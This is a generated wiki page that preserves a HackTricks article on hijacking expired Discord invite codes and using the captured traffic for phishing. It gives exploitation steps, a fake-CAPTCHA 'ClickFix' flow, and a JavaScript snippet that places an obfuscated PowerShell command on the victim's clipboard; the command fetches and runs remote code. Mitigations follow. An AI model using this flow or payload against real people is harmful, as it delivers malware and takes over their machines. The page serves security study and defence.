---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Discord Invite Hijacking

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-generic-methodologies-and-resources-phishing-methodology-discord-invite-hijacking` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/phishing-methodology/discord-invite-hijacking.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Discord Invite Hijacking](../../topics/generic-methodologies-and-resources/discord-invite-hijacking.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-generic-methodologies-and-resources-phishing-methodology-discord-invite-hijacking |
| name | Discord Invite Hijacking |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/phishing-methodology/discord-invite-hijacking.md |

## Preserved Source Material

````yaml
_body: "# Discord Invite Hijacking\n\n{{#include ../../banners/hacktricks-training.md}}\n\nDiscord’s invite system vulnerability\
  \ allows threat actors to claim expired or deleted invite codes (temporary, permanent, or custom vanity) as new vanity links\
  \ on any Level 3 boosted server. By normalizing all codes to lowercase, attackers can pre-register known invite codes and\
  \ silently hijack traffic once the original link expires or the source server loses its boost.\n\n## Invite Types and Hijack\
  \ Risk\n\n| Invite Type           | Hijackable? | Condition / Comments                                                 \
  \                                      |\n|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|\n\
  | Temporary Invite Link | ✅          | After expiration, the code becomes available and can be re-registered as a vanity\
  \ URL by a boosted server. |\n| Permanent Invite Link | ⚠️          | If deleted and consisting only of lowercase letters\
  \ and digits, the code may become available again.        |\n| Custom Vanity Link    | ✅          | If the original server\
  \ loses its Level 3 Boost, its vanity invite becomes available for new registration.    |\n\n## Exploitation Steps\n\n1.\
  \ Reconnaissance\n   - Monitor public sources (forums, social media, Telegram channels) for invite links matching the pattern\
  \ `discord.gg/{code}` or `discord.com/invite/{code}`.\n   - Collect invite codes of interest (temporary or vanity).\n2.\
  \ Pre-registration\n   - Create or use an existing Discord server with Level 3 Boost privileges.\n   - In **Server Settings\
  \ → Vanity URL**, attempt to assign the target invite code. If accepted, the code is reserved by the malicious server.\n\
  3. Hijack Activation\n   - For temporary invites, wait until the original invite expires (or manually delete it if you control\
  \ the source).\n   - For uppercase-containing codes, the lowercase variant can be claimed immediately, though redirection\
  \ only activates after expiration.\n4. Silent Redirection\n   - Users visiting the old link are seamlessly sent to the attacker-controlled\
  \ server once the hijack is active.\n\n## Phishing Flow via Discord Server\n\n1. Restrict server channels so only a **#verify**\
  \ channel is visible.\n2. Deploy a bot (e.g., **Safeguard#0786**) to prompt newcomers to verify via OAuth2.\n3. Bot redirects\
  \ users to a phishing site (e.g., `captchaguard.me`) under the guise of a CAPTCHA or verification step.\n4. Implement the\
  \ **ClickFix** UX trick:\n   - Display a broken CAPTCHA message.\n   - Guide users to open the **Win+R** dialog, paste a\
  \ preloaded PowerShell command, and press Enter.\n\n### ClickFix Clipboard Injection Example\n\n```javascript\n// Copy malicious\
  \ PowerShell command to clipboard\nconst cmd = `powershell -NoExit -Command \"$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';`\
  \ +\n            `$u=($r[-1..-($r.Length)]-join '');` +\n            `$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));`\
  \ +\n            `iex (iwr -Uri $url)\"`;\nnavigator.clipboard.writeText(cmd);\n```\n\nThis approach avoids direct file\
  \ downloads and leverages familiar UI elements to lower user suspicion.\n\n## Mitigations\n\n- Use permanent invite links\
  \ containing at least one uppercase letter or non-alphanumeric character (never expire, non-reusable).\n- Regularly rotate\
  \ invite codes and revoke old links.\n- Monitor Discord server boost status and vanity URL claims.\n- Educate users to verify\
  \ server authenticity and avoid executing clipboard-pasted commands.\n\n## References\n\n- From Trust to Threat: Hijacked\
  \ Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)\n\
  - Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)\n\
  \n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: generic-methodologies-and-resources/phishing-methodology/discord-invite-hijacking.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/phishing-methodology/discord-invite-hijacking.md
````
